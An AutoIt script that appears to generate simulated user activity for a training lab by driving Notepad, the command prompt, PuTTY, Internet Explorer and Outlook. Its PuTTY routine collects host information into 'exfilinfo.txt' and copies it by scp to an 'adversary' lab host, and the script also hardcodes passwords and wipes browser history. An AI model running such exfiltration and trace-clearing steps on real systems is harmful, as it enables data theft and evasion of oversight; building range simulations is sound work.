; Save file as N7C0.au3 in order to run
;
; Machine must have AutoIt installed on it
; unless you are running the exe version
;
; https://www.autoitscript.com/site/
; Use Aut2Exe built in tool to compile to executable
;
; Run Directory needs a file called websites.txt
; with a line seperated list of websites to browse to
; in order for web browsing to work
;
; main() is located at the bottom
;
; James A. Muldrow - jamesmuldrow@gmail.com
;

#include <msgboxconstants.au3>
#include <AutoItConstants.au3>
#include <IE.au3>
#include <file.au3>

Func MoveMouse($x,$y)
   ; Function used to move mouse around
   ; Based on x,y coordinates
   MouseMove($x,$y,50)
EndFunc

Func OpenApp($appString, $appClass)
   ; Run Notepad with the window maximized.
   $iPID = Run($appString, "", @SW_SHOWMAXIMIZED)
   ; Wait 10 seconds for the Notepad window to appear.
   WinWait("[CLASS:$appClass]", "", 1)

   Return $iPID
EndFunc

Func CloseApp($PID)
	  ProcessClose($PID)
EndFunc

Func SlowSend($str,$speed=55, $CR_After = False)
   Local $string = StringSplit($str, " ")

   for $i = 1 To $string[0]
	  Send($string[$i] & " ")
	  Sleep($speed)
   Next

   ; If True then send a Carrage Return at the end
   if $CR_After == True Then
	  Send(@CR)
   EndIf
EndFunc

Func IE_Reset_History()

   ;Cleanup - Resets all IE Settings
   Run("rundll32.exe inetcpl.cpl ResetIEtoDefaults")
   sleep(2000)
   ControlClick("Reset Internet Explorer Settings", "", "Button1")
   WinWait("Reset Internet Explorer Settings")
   sleep(2000)
   ControlClick("Reset Internet Explorer Settings", "", 1, "left", 1, 51, 12)
   sleep(2000)
   WinWait("Reset Internet Explorer Settings", "&Close")
   Sleep(2000)
   While WinExists("Reset Internet Explorer Settings", "&Close")
	  ControlClick("Reset Internet Explorer Settings", "", 6608, "left", 1, 36, 11)
   WEnd
EndFunc

Func intro()
   $logo_line_1 = "**************************************" & @CR
   $logo_line_2 = "********** N7C0 version 1.0 **********" & @CR
   $logo_line_3 = "********** Created by @Nacho7C0 ******" & @CR
   $logo_line_4 = "******* User Simulation Done Right ***" & @CR
   $logo_line_5 = "**************************************" & @CR
   $logo = $logo_line_1 & $logo_line_2 & $logo_line_3 & $logo_line_4 & $logo_line_5

   $intro_line_1 = "Hi, my name is N7C0. I am your new" & @CR & "redefined user sim{!}"
   $intro_line_2 = "I will utilize"& @CR &"this opportunity to demonstrate my" &@CR& "current capabilities."
   $intro_line_3 = "Let's start with" &@CR& "my ability to create and manipulate" &@CR& "documents like the one you are currently"&@CR&"reading."

   $NP_PID = OpenApp("Notepad.exe", "Notepad")
   SlowSend($logo,"",True)
   ;Sleep(1000)
   ;SlowSend("PLEASE DO NOT USE MACHINE UNTIL THE"&@CR&"INTRO IS OVER. I'LL ADD ESC SEQ LATER" & @CR, 100,True)
   Sleep(1000)
   SlowSend($intro_line_1)
   Sleep(1000)
   SlowSend($intro_line_2)
   Sleep(1000)
   SlowSend($intro_line_3,100, True)

   Sleep(2000)
   SlowSend("",100,True)
   SlowSend("Let's go ahead and save this document",100,True)
   SlowSend("I'll use the keyboard shortcut" &@CR& "(CTRL {+} S) to do this because I'm L33T{!}",100,True)
   Sleep(2000)
   Send("^s")
   Sleep(2000)
   Send("N7CO_Intro", 100)
   Sleep(1000)
   Send("{ENTER}")
   if WinExists("Confirm Save As") Then
	  Send("{TAB}")
	  Sleep(3000)
	  Send("{ENTER}")
   EndIf

   Sleep(3000)

   SlowSend(@CR & "Now that I saved this document lets look"&@CR&"at what else i can do.", 100, True)
   Sleep(2000)
   CloseApp($NP_PID)

EndFunc

Func intro_cmd()
   $NP_PID = OpenApp("Notepad.exe", "Notepad"); remove this line if you decide to use intro and the function at the same Time

   SlowSend("We'll start by using the command prompt", 100, True)

   Sleep(2500)

   $CMD_PID = OpenApp("cmd.exe", "ConsoleWindowClass")
   Sleep(1000)
   SlowSend("powershell", 100, True)
   Sleep(3000)
   SlowSend("ipconfig", 100, True)
   Sleep(3000)
   SlowSend("ping 192.168.155.2", 100, True)
   Sleep(4000)
   SlowSend("nslookup www.google.com", 100, True)
   Sleep(2000)
   SlowSend("exit",100,true)
   Sleep(1000)
   SlowSend("exit",100,true)

   CloseApp($NP_PID)
EndFunc

func intro_putty()
   $NP_PID = OpenApp("Notepad.exe", "Notepad"); remove this line if you decide to use intro and the function at the same Time
   Sleep(1000)
   SlowSend("Cool, I can execute commands. Now let's see how I can use Putty",100,true)
   $PUTTY_PID = OpenApp("C:\Users\"& EnvGet("username") &"\Desktop\putty.exe", "PuTTYConfigBox")
   SlowSend("192.168.155.131",100, true)
   Sleep(2000)
   if WinActive("PuTTY Security Alert") Then
	  Sleep(1000)
	  Send("{TAB}")
	  Send("{ENTER}")
   EndIf

   Send("admin")
   Send("{ENTER}")
   Sleep(1000)
   Send("tartans@1")
   Send("{ENTER}")
   Sleep(2000)
   SlowSend("ls -lah", 100, True)
   Sleep(2000)
   SlowSend("uname -a >> exfilinfo.txt", 100, True)
   Sleep(2000)
   SlowSend("ifconfig >> exfilinfo.txt", 100, True)
   Sleep(2000)
   SlowSend("df -h >> exfilinfo.txt", 100, True)
   Sleep(2000)
   SlowSend("docker ps -a >> exfilinfo.txt", 100, True)
   Sleep(2000)
   SlowSend("cat exfilinfo.txt", 100, True)
   Sleep(2000)
   Send("tar -cf takethattakethat.tar exfilinfo.txt")
   Send("{ENTER}")
   Sleep(2000)
   Send("scp takethattakethat.tar adversary@192.168.155.132:~/")
   Send("{ENTER}")
   Sleep(1000)
   Send("tartans@1")
   Send("{ENTER}")
   Sleep(1000)
   Send("ssh adversary@192.168.155.132")
   Send("{ENTER}")
   Sleep(1000)
   Send("tartans@1")
   Send("{ENTER}")
   Sleep(2000)
   Send("ls -lah")
   Send("{ENTER}")
   Sleep(2000)
   Send("tar -xf takethattakethat.tar")
   Send("{ENTER}")
   Sleep(2000)
   Send("ls -lah")
   Send("{ENTER}")
   Sleep(2000)
   Send("cat exfilinfo.txt")
   Sleep(2000)
   Send("{ENTER}")
   Sleep(4000)
   SlowSend("exit", 100, True)
   Sleep(2000)
   SlowSend("exit", 100, True)

   Sleep(2000)
   SlowSend("Pretty cool stuff, huh?", 100, True)

   Sleep(3000)
   CloseApp($NP_PID)

EndFunc

func intro_webmail()
   $NP_PID = OpenApp("Notepad.exe", "Notepad"); remove this line if you decide to use intro and the function at the same Time
   Sleep(1000)
   SlowSend("Now let's see how I can browse to a website, log in, logout and erase my browser history.",100,true)
   Sleep(2000)

   $oIE = _IECreate("https://accounts.google.com/ServiceLogin", 1)

   $Name = _IEGetObjByName($oIE, "Email")
   $Button = _IEGetObjById($oIE, "next")

   _IEFormElementSetValue($Name, "badcountryadversary@gmail.com")

   _IEAction($Button, "click")
   Sleep(2000)
   $oIE2 = _IECreate("https://accounts.google.com/ServiceLogin",1)

   $Passwd = _IEGetObjByName($oIE2, "Passwd")
   $Button = _IEGetObjById($oIE2, "next")

   _IEFormElementSetValue($Passwd, "tartans@1")

   _IEAction($Button, "click")
   Sleep(2000)

   ; Attach to and remove welcome screen from IE 11.
	  $oIE3 = _IECreate("https://www.microsoft.com/en-us/welcomeie11/",1)
	  _IEQuit($oIE3)
	  Sleep(500)

   _IENavigate($oIE,"gmail.com")
   ; Pause for 10 seconds after login
   sleep(10000)

   _IENavigate($oIE,"https://accounts.google.com/Logout?hl")

   ; Quit IE
   _IEQuit($oIE)
   _IEQuit($oIE2)

   IE_Reset_History()

   Sleep(3000)
   Send(@CR & "Not bad, huh.")
   Sleep(2000)
   CloseApp($NP_PID)
EndFunc

Func intro_browse_sites()
   $NP_PID = OpenApp("Notepad.exe", "Notepad"); remove this line if you decide to use intro and the function at the same Time
   Sleep(1000)
   SlowSend("Now let's see how I can browse to websites based on the following list of 11 sites that are being pulled from a text file.",100,true)
   Sleep(2000)

   $websites = FileReadToArray("websites.txt")
   send("usmc.mil/" & @CR)
   Sleep(500)
   for $item In $websites
	  Send($item & @CR)
	  Sleep(500)
   Next

   $oIE = _IECreate("www.usmc.mil", 1)
   Sleep(1000)

   ; Attach to and remove welcome screen from IE 11.
   $oIE3 = _IECreate("https://www.microsoft.com/en-us/welcomeie11/",1)
   _IEQuit($oIE3)
   Sleep(1000)


   for $item In $websites
	  _IENavigate ($oIE,$item)
	  Sleep(500)
   Next

   _IEQuit($oIE)
   Sleep(1000)
   SlowSend(@CR & "Nice...",100,true)
   Sleep(4000)
   CloseApp($NP_PID)
EndFunc

Func intro_send_email()
   $NP_PID = OpenApp("Notepad.exe", "Notepad"); remove this line if you decide to use intro and the function at the same Time
   Sleep(1000)
   SlowSend("My final display of force will be the ability to send email from outlook. Standby .... " & @CR,100,true)
   Sleep(3000)
   ; Open Outlook
   $OTLK_PID = OpenApp("C:\Program Files (x86)\Microsoft Office\root\Office16\outlook.exe","rctrl_renwnd32")

   ; Wait 10 seconds for the Outlook window to appear.
   WinWait("[CLASS:rctrl_renwnd32]", "", 10)

   ; Wait for 10 seconds.
   Sleep(10000)

   send("{CTRLDOWN}")
   send("n")
   send("{CTRLUP}")

   Sleep(2000)
   Send("jamesmuldrow@gmail.com")
   Sleep(1000)
   Send("{TAB}")
   Sleep(1000)
   Send("{TAB}")
   Sleep(1000)
   Send("{TAB}")
   Sleep(1000)
   Send("This is a test")
   Send("{TAB}")
   Sleep(1000)
   Send("Here I go adding a random body to my message...")
   Sleep(1000)
   Send("{CTRLDOWN}")
   Send("{ENTER}")
   send("{CTRLUP}")
   Sleep(1000)
   Send("{ENTER}")
   Sleep(2000)
   CloseApp($OTLK_PID)
   Sleep(1000)
   Send("This concludes my intro. If you would like anything added, feel free to contact my developer at jamesmuldrow@gmail.com" & @CR)
   Sleep(5000)
   Send(@CR & "Goodbye")
   Sleep(5000)
   CloseApp($NP_PID)

EndFunc

Func main()

   intro()
   intro_cmd()
   intro_putty()
   intro_webmail()
   intro_browse_sites()
   intro_send_email()

EndFunc


main()
